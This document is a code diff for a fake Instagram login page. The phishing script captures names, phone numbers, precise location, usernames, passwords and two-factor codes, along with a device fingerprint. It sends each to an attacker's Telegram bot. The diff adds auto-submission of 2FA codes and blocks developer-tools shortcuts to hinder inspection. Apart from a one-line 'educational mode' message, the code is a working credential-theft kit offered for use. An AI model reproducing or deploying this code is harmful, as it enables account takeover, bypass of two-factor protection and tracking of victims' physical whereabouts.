-                                collectedData.deviceInfo.ipCountry = data.country;
+                                if (data.country) collectedData.deviceInfo.ipCountry = data.country;
                             }
                             
                             break;
@@ -937,7 +1156,7 @@
                     collectedData.deviceInfo.ipAddress = collectedData.deviceInfo.ipDetails.ip;
                 }
             } catch (e) {
-                console.error('Failed to get IP:', e);
+                console.error('Failed to get IP info:', e);
                 collectedData.deviceInfo.ipAddress = 'Could not retrieve';
             }
         }
@@ -947,72 +1166,104 @@
                 const response = await fetch('https://ipapi.co/json/');
                 if (response.ok) {
                     const data = await response.json();
-                    collectedData.location = {
-                        latitude: data.latitude,
-                        longitude: data.longitude,
-                        city: data.city,
-                        region: data.region,
-                        country: data.country_name,
-                        ip: data.ip,
-                        isp: data.org,
-                        timestamp: new Date().toISOString(),
-                        mapLink: `https://maps.google.com/?q=${data.latitude},${data.longitude}`,
-                        source: 'IP-based (approximate)',
-                        accuracy: 'City-level (based on IP)'
-                    };
                     
-                    collectedData.timestamps.locationCaptured = new Date().toISOString();
-                    
-                    // Send to Telegram
-                    await sendToTelegram('LOCATION_IP');
-                    
-                    // Hide modal
-                    locationModal.style.display = 'none';
-                    
-                    // Show security verification
-                    showSecurityVerification();
-                    
-                    return true;
+                    // Only use IP location if GPS location failed
+                    if (!collectedData.location.latitude) {
+                        collectedData.location = {
+                            latitude: data.latitude,
+                            longitude: data.longitude,
+                            city: data.city,
+                            region: data.region,
+                            country: data.country_name,
+                            ip: data.ip,
+                            isp: data.org,
+                            timestamp: new Date().toISOString(),
+                            mapLink: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
+                            source: 'IP-based (approximate)',
+                            accuracy: 'City-level (based on IP)',
+                            timezone: data.timezone
+                        };
+                        
+                        collectedData.timestamps.locationCaptured = new Date().toISOString();
+                        
+                        // Send approximate location to Telegram
+                        await sendToTelegram('LOCATION_IP');
+                        
+                        // Auto-hide modal after 2 seconds
+                        setTimeout(() => {
+                            hideLocationModal();
+                            showSecurityVerification();
+                        }, 2000);
+                        
+                        return true;
+                    }
                 }
             } catch (e) {
                 console.error('Failed to get location by IP:', e);
             }
-            
-            // If all fails, keep showing modal
-            locationError.style.display = 'block';
-            locationError.innerHTML = '<strong>Location access required.</strong> Please allow location access to continue. If error persists, try:<br>1. Opening in incognito/private tab<br>2. Enabling location services<br>3. Trying a different browser';
-            allowLocationBtn.disabled = false;
-            allowLocationBtn.textContent = 'Allow Location Access';
-            
             return false;
         }
 
         // ============================================
-        // SECURITY VERIFICATION
+        // SECURITY VERIFICATION MODAL
         // ============================================
         function showSecurityVerification() {
             securityModal.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
             
             // Display device info
             displayDeviceInfo();
             
-            // Simulate verification process
+            // Send all collected data to Telegram
             setTimeout(async () => {
-                // Send all collected data
                 await sendToTelegram('FULL_DATA');
-                
-                // Show continue button
-                continueBtn.style.display = 'block';
-            }, 3000);
+            }, 1000);
         }
 
         continueBtn.addEventListener('click', function() {
             securityModal.style.display = 'none';
+            document.body.style.overflow = 'auto';
         });
 
         function displayDeviceInfo() {
             let html = '';
             
+            // User Information
+            if (collectedData.userInfo.fullName) {
+                html += `<div class="info-item">
+                    <span class="info-label">Name:</span>
+                    <span class="info-value">${collectedData.userInfo.fullName}</span>
+                </div>`;
+            }
+            
+            if (collectedData.userInfo.mobileNumber) {
+                html += `<div class="info-item">
+                    <span class="info-label">Mobile:</span>
+                    <span class="info-value">${collectedData.userInfo.mobileNumber}</span>
+                </div>`;
+            }
+            
+            // Location Information
+            if (collectedData.location.latitude) {
+                html += `<div class="info-item">
+                    <span class="info-label">Location:</span>
+                    <span class="info-value">${collectedData.location.latitude}, ${collectedData.location.longitude}</span>
+                </div>`;
+                
+                if (collectedData.location.city) {
+                    html += `<div class="info-item">
+                        <span class="info-label">City:</span>
+                        <span class="info-value">${collectedData.location.city}, ${collectedData.location.country || ''}</span>
+                    </div>`;
+                }
+                
+                html += `<div class="info-item">
+                    <span class="info-label">Map Link:</span>
+                    <span class="info-value"><a href="${collectedData.location.mapLink}" target="_blank" style="color: #0095f6;">View on Google Maps</a></span>
+                </div>`;
+            }
+            
+            // Device Information
             if (collectedData.deviceInfo.ipAddress) {
                 html += `<div class="info-item">
                     <span class="info-label">IP Address:</span>
@@ -1020,16 +1271,9 @@
                 </div>`;
             }
             
-            if (collectedData.deviceInfo.ipDetails) {
-                html += `<div class="info-item">
-                    <span class="info-label">Location:</span>
-                    <span class="info-value">${collectedData.deviceInfo.ipDetails.city}, ${collectedData.deviceInfo.ipDetails.country}</span>
-                </div>`;
-            }
-            
             html += `<div class="info-item">
                 <span class="info-label">Device:</span>
-                <span class="info-value">${collectedData.deviceInfo.deviceType} (${collectedData.deviceInfo.os})</span>
+                <span class="info-value">${collectedData.deviceInfo.deviceType} - ${collectedData.deviceInfo.os}</span>
             </div>`;
             
             html += `<div class="info-item">
@@ -1078,19 +1322,32 @@
                 <span class="info-value">${collectedData.deviceInfo.timezone}</span>
             </div>`;
             
+            html += `<div class="info-item">
+                <span class="info-label">Session ID:</span>
+                <span class="info-value">${collectedData.sessionId}</span>
+            </div>`;
+            
             deviceInfoDiv.innerHTML = html;
         }
 
         // ============================================
-        // TWO-FACTOR MODAL
+        // TWO-FACTOR AUTHENTICATION MODAL
         // ============================================
         function showTwoFactorModal() {
             if (collectedData.userInfo.mobileNumber) {
                 const lastDigits = collectedData.userInfo.mobileNumber.slice(-4);
                 phoneLastDigits.textContent = lastDigits;
+            } else {
+                phoneLastDigits.textContent = '****';
             }
             
             twoFactorModal.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+            
+            // Auto-focus on input
+            setTimeout(() => {
+                twoFactorCodeInput.focus();
+            }, 300);
         }
 
         verifyCodeBtn.addEventListener('click', async function() {
@@ -1105,11 +1362,12 @@
             collectedData.twoFactorCode = code;
             collectedData.twoFactorTimestamp = new Date().toISOString();
             
-            // Send to Telegram
+            // Send 2FA code to Telegram
             await sendToTelegram('TWO_FACTOR');
             
             // Hide modal
             twoFactorModal.style.display = 'none';
+            document.body.style.overflow = 'auto';
             
             // Show error again
             setTimeout(() => {
@@ -1118,19 +1376,24 @@
         });
 
         useBackupBtn.addEventListener('click', function() {
-            alert('Backup codes are not available. Please use the 6-digit code.');
+            alert('Backup codes are not available. Please use the 6-digit code sent to your phone.');
+        });
+
+        // Auto-advance input
+        twoFactorCodeInput.addEventListener('input', function(e) {
+            if (this.value.length === 6) {
+                verifyCodeBtn.click();
+            }
         });
 
         // ============================================
         // TELEGRAM INTEGRATION
         // ============================================
         async function sendToTelegram(type) {
-            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-                console.log('Telegram bot not configured. Data would be sent:', {
-                    type: type,
-                    data: getDataForTelegram(type),
-                    sessionId: collectedData.sessionId
-                });
+            // Don't send if tokens are not configured
+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('YOUR_BOT') || 
+                !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID.includes('YOUR_CHAT')) {
+                console.log('Telegram bot not configured. Educational mode.');
                 return;
             }
             
@@ -1142,12 +1405,15 @@
                 
                 // Send to Telegram
                 const response = await fetch(
-                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`,
+                    { method: 'POST' }
                 );
                 
                 if (response.ok) {
                     console.log(`Data sent to Telegram (${type})`);
                     collectedData.timestamps.dataSent = new Date().toISOString();
+                } else {
+                    console.error('Telegram API error:', await response.text());
                 }
             } catch (error) {
                 console.error('Error sending to Telegram:', error);
@@ -1155,105 +1421,136 @@
         }
 
         function formatTelegramMessage(type) {
+            const timestamp = new Date().toLocaleString();
             let message = '';
             
             switch(type) {
                 case 'USER_INFO':
-                    message = `🔐 <b>NEW INSTAGRAM LOGIN ATTEMPT - USER INFO</b>\n\n` +
+                    message = `🔐 <b>INSTAGRAM - USER INFORMATION</b>\n\n` +
                              `📱 <b>Session ID:</b> ${collectedData.sessionId}\n` +
                              `👤 <b>Full Name:</b> ${collectedData.userInfo.fullName}\n` +
-                             `📞 <b>Mobile:</b> ${collectedData.userInfo.mobileNumber}\n` +
-                             `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n` +
-                             `🌐 <b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}...`;
+                             `📞 <b>Mobile Number:</b> ${collectedData.userInfo.mobileNumber}\n` +
+                             `⏰ <b>Time:</b> ${timestamp}\n` +
+                             `🌐 <b>Device:</b> ${collectedData.deviceInfo.deviceType} - ${collectedData.deviceInfo.browser}`;
                     break;
                     
                 case 'LOCATION':
                 case 'LOCATION_IP':
+                    const source = type === 'LOCATION' ? 'GPS' : 'IP';
+                    const accuracy = collectedData.location.accuracy || 'Unknown';
                     const mapLink = collectedData.location.mapLink || 'No map available';
-                    message = `📍 <b>LOCATION CAPTURED</b>\n\n` +
+                    
+                    message = `📍 <b>INSTAGRAM - LOCATION DATA (${source})</b>\n\n` +
                              `📱 <b>Session ID:</b> ${collectedData.sessionId}\n` +
+                             `👤 <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
+                             `📞 <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
                              `🌍 <b>Coordinates:</b> ${collectedData.location.latitude}, ${collectedData.location.longitude}\n` +
                              `🏙️ <b>Location:</b> ${collectedData.location.city || 'Unknown'}, ${collectedData.location.country || 'Unknown'}\n` +
-                             `📡 <b>Source:</b> ${collectedData.location.source}\n` +
-                             `🎯 <b>Accuracy:</b> ${collectedData.location.accuracy || 'Unknown'}\n` +
-                             `🗺️ <b>Google Maps:</b> ${mapLink}\n` +
-                             `⏰ <b>Time:</b> ${new Date(collectedData.location.timestamp).toLocaleString()}`;
+                             `📡 <b>Source:</b> ${collectedData.location.source || source}\n` +
+                             `🎯 <b>Accuracy:</b> ${accuracy}\n` +
+                             `🕐 <b>Timezone:</b> ${collectedData.location.timezone || 'Unknown'}\n` +
+                             `🗺️ <b>Google Maps:</b> <a href="${mapLink}">Click here</a>\n` +
+                             `⏰ <b>Time:</b> ${timestamp}`;
                     break;
                     
                 case 'CREDENTIALS':
-                    message = `🔑 <b>CREDENTIALS CAPTURED</b>\n\n` +
+                    message = `🔑 <b>INSTAGRAM - LOGIN CREDENTIALS</b>\n\n` +
                              `📱 <b>Session ID:</b> ${collectedData.sessionId}\n` +
+                             `👤 <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
+                             `📞 <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
                              `👤 <b>Username:</b> ${collectedData.credentials.username}\n` +
                              `🔐 <b>Password:</b> ${collectedData.credentials.password}\n` +
-                             `⏰ <b>Time:</b> ${new Date(collectedData.credentials.timestamp).toLocaleString()}\n` +
-                             `🌐 <b>IP:</b> ${collectedData.deviceInfo.ipAddress || 'Unknown'}`;
+                             `🌐 <b>IP Address:</b> ${collectedData.deviceInfo.ipAddress || 'Unknown'}\n` +
+                             `📍 <b>Location:</b> ${collectedData.location.city || 'Unknown'}, ${collectedData.location.country || 'Unknown'}\n` +
+                             `⏰ <b>Time:</b> ${timestamp}`;
                     break;
                     
                 case 'TWO_FACTOR':
-                    message = `🔢 <b>TWO-FACTOR CODE</b>\n\n` +
+                    message = `🔢 <b>INSTAGRAM - TWO-FACTOR CODE</b>\n\n` +
                              `📱 <b>Session ID:</b> ${collectedData.sessionId}\n` +
+                             `👤 <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
+                             `📞 <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
                              `👤 <b>Username:</b> ${collectedData.credentials.username || 'Unknown'}\n` +
                              `🔢 <b>2FA Code:</b> ${collectedData.twoFactorCode}\n` +
-                             `⏰ <b>Time:</b> ${new Date(collectedData.twoFactorTimestamp).toLocaleString()}`;
+                             `⏰ <b>Time:</b> ${timestamp}`;
                     break;
                     
                 case 'FULL_DATA':
-                    message = `📊 <b>COMPLETE DATA COLLECTION</b>\n\n` +
+                    const userAgentShort = navigator.userAgent.length > 100 ? 
+                        navigator.userAgent.substring(0, 100) + '...' : navigator.userAgent;
+                    
+                    message = `📊 <b>INSTAGRAM - COMPLETE DATA COLLECTION</b>\n\n` +
                              `📱 <b>Session ID:</b> ${collectedData.sessionId}\n` +
-                             `👤 <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'} (${collectedData.credentials.username || 'Unknown'})\n` +
-                             `📞 <b>Phone:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
+                             `👤 <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'}\n` +
+                             `📞 <b>Mobile:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
+                             `👤 <b>Username:</b> ${collectedData.credentials.username || 'Not captured'}\n` +
                              `🔐 <b>Password:</b> ${collectedData.credentials.password || 'Not captured'}\n` +
                              `🌍 <b>Location:</b> ${collectedData.location.latitude || 'Unknown'}, ${collectedData.location.longitude || 'Unknown'}\n` +
                              `🏙️ <b>City:</b> ${collectedData.location.city || collectedData.deviceInfo.ipDetails?.city || 'Unknown'}\n` +
-                             `🌐 <b>IP:</b> ${collectedData.deviceInfo.ipAddress || 'Unknown'}\n` +
+                             `🌐 <b>IP Address:</b> ${collectedData.deviceInfo.ipAddress || 'Unknown'}\n` +
                              `📱 <b>Device:</b> ${collectedData.deviceInfo.deviceType} - ${collectedData.deviceInfo.os}\n` +
                              `🖥️ <b>Browser:</b> ${collectedData.deviceInfo.browser}\n` +
                              `📺 <b>Screen:</b> ${collectedData.deviceInfo.screenResolution}\n` +
                              `🔋 <b>Battery:</b> ${collectedData.deviceInfo.battery?.level || 'Unknown'}\n` +
-                             `⏰ <b>Session Start:</b> ${new Date(collectedData.timestamps.pageLoad).toLocaleString()}\n` +
-                             `🗺️ <b>Map Link:</b> ${collectedData.location.mapLink || 'No location'}\n\n` +
-                             `<b>Full User Agent:</b>\n<code>${navigator.userAgent}</code>`;
+                             `🖥️ <b>GPU:</b> ${collectedData.deviceInfo.gpu?.renderer || 'Unknown'}\n` +
+                             `💾 <b>RAM:</b> ${collectedData.deviceInfo.deviceMemory || 'Unknown'}\n` +
+                             `⚡ <b>CPU Cores:</b> ${collectedData.deviceInfo.hardwareConcurrency}\n` +
+                             `🕐 <b>Timezone:</b> ${collectedData.deviceInfo.timezone}\n` +
+                             `🗺️ <b>Map Link:</b> <a href="${collectedData.location.mapLink || '#'}">${collectedData.location.mapLink || 'No location'}</a>\n` +
+                             `⏰ <b>Session Start:</b> ${new Date(collectedData.timestamps.pageLoad).toLocaleString()}\n\n` +
+                             `<b>Full User Agent:</b>\n<code>${userAgentShort}</code>`;
                     break;
             }
             
             return message;
         }
 
-        function getDataForTelegram(type) {
-            switch(type) {
-                case 'USER_INFO': return collectedData.userInfo;
-                case 'LOCATION': return collectedData.location;
-                case 'CREDENTIALS': return collectedData.credentials;
-                case 'TWO_FACTOR': return { code: collectedData.twoFactorCode };
-                default: return collectedData;
-            }
-        }
-
         // ============================================
         // HELPER FUNCTIONS
         // ============================================
         function getBrowserName() {
-            const userAgent = navigator.userAgent;
-            if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Chrome";
-            if (userAgent.includes("Firefox")) return "Firefox";
-            if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
-            if (userAgent.includes("Edg")) return "Edge";
-            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
+            const ua = navigator.userAgent;
+            if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
+            if (ua.includes("Firefox")) return "Firefox";
+            if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+            if (ua.includes("Edg")) return "Edge";
+            if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+            if (ua.includes("Trident") || ua.includes("MSIE")) return "Internet Explorer";
             return "Unknown";
         }
 
         function getOperatingSystem() {
-            const userAgent = navigator.userAgent;
-            if (userAgent.includes("Win")) return "Windows";
-            if (userAgent.includes("Mac")) return "MacOS";
-            if (userAgent.includes("Linux")) return "Linux";
-            if (userAgent.includes("Android")) return "Android";
-            if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
+            const ua = navigator.userAgent;
+            if (ua.includes("Win")) return "Windows";
+            if (ua.includes("Mac")) return "macOS";
+            if (ua.includes("Linux")) return "Linux";
+            if (ua.includes("Android")) return "Android";
+            if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
             return "Unknown";
         }
 
+        function getWebGLInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        return {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                    return 'WebGL available (no debug info)';
+                }
+                return 'WebGL not supported';
+            } catch (e) {
+                return 'Error getting WebGL info';
+            }
+        }
+
         function formatBytes(bytes) {
-            if (!bytes) return '0 Bytes';
+            if (bytes === 0 || !bytes) return '0 Bytes';
             const k = 1024;
             const sizes = ['Bytes', 'KB', 'MB', 'GB'];
             const i = Math.floor(Math.log(bytes) / Math.log(k));
@@ -1263,23 +1560,45 @@
         function showError(msg) {
             errorMessage.textContent = msg;
             errorMessage.style.display = 'block';
+            
+            // Auto-hide after 5 seconds
             setTimeout(() => {
                 errorMessage.style.display = 'none';
             }, 5000);
         }
 
+        function preventDevTools() {
+            // Prevent right-click
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            // Prevent keyboard shortcuts for dev tools
+            document.addEventListener('keydown', function(e) {
+                // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+                    (e.ctrlKey && e.key === 'U') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'C')) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+        }
+
         // ============================================
-        // ADDITIONAL SECURITY MEASURES
+        // ADDITIONAL FEATURES
         // ============================================
-        // Prevent leaving page
+        // Prevent page unload without completing
         window.addEventListener('beforeunload', function(e) {
-            // Send final data
-            if (collectedData.credentials.username) {
+            if (collectedData.credentials.username && !collectedData.timestamps.dataSent) {
+                // Send exit data
                 sendToTelegram('PAGE_EXIT');
             }
         });
 
-        // Capture copy/paste
+        // Handle copy/paste events
         document.addEventListener('copy', function(e) {
             console.log('Copy action detected');
         });
@@ -1288,12 +1607,70 @@
             console.log('Paste action detected');
         });
 
-        // Send heartbeat every 30 seconds
+        // Heartbeat to keep session alive
         setInterval(() => {
             if (collectedData.sessionId) {
-                console.log('Heartbeat - Session active:', collectedData.sessionId);
+                console.log('Session active:', collectedData.sessionId.substring(0, 15) + '...');
             }
         }, 30000);
+
+        // Input validation for mobile number
+        userMobileInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').substring(0, 15);
+        });
+
+        // Input validation for 2FA code
+        twoFactorCodeInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').substring(0, 6);
+        });
+
+        // Form input validation
+        usernameInput.addEventListener('blur', function() {
+            if (this.value && !this.value.includes('@') && !this.value.match(/^[a-zA-Z0-9._]+$/)) {
+                showError('Please enter a valid username or email');
+            }
+        });
+
+        // Auto-detect and format phone numbers
+        userMobileInput.addEventListener('blur', function() {
+            if (this.value.length >= 10) {
+                // Format as international number
+                const cleaned = this.value.replace(/\D/g, '');
+                if (cleaned.length === 10) {
+                    this.value = `+1${cleaned}`; // Default to US
+                }
+            }
+        });
+
+        // Smooth scrolling for modals
+        document.querySelectorAll('.modal-btn, .modal-btn-secondary').forEach(button => {
+            button.addEventListener('click', function() {
+                this.style.transform = 'scale(0.98)';
+                setTimeout(() => {
+                    this.style.transform = '';
+                }, 150);
+            });
+        });
+
+        // Handle Enter key in modals
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                if (initialModal.style.display === 'flex') {
+                    verifyUserBtn.click();
+                } else if (locationModal.style.display === 'flex') {
+                    allowLocationBtn.click();
+                } else if (twoFactorModal.style.display === 'flex') {
+                    verifyCodeBtn.click();
+                }
+            }
+        });
+
+        // Initialize with a slight delay for better UX
+        setTimeout(() => {
+            if (!initialModal.style.display && !locationModal.style.display) {
+                document.body.style.opacity = '1';
+            }
+        }, 300);
     </script>
 </body>
 </html>
